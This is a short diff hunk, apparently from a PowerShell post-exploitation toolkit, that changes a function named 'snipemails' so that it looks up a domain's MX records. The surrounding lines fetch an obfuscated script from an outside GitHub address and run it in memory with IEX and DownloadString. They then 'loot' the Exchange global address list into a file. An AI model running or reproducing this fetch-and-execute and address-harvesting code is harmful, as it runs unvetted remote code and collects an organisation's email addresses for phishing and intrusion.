@@ -1706,7 +1706,7 @@ function snipemails
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/snipemails.ps1')
     if ($currentdomain)
     {
-        $exch = Resolve-DnsName -type $currentdomain
+        $exch = Resolve-DnsName -type mx $currentdomain
         if ($exch.Count -cne 1){$first = $exch.NameExchange | select-object -first 1}else{$first = $exch}
         Write-Host "Looting adress book"
         Get-GlobalAddressList -ExchHostname $first -OutFile "$currentPath\DomainRecon\Email-list.txt"
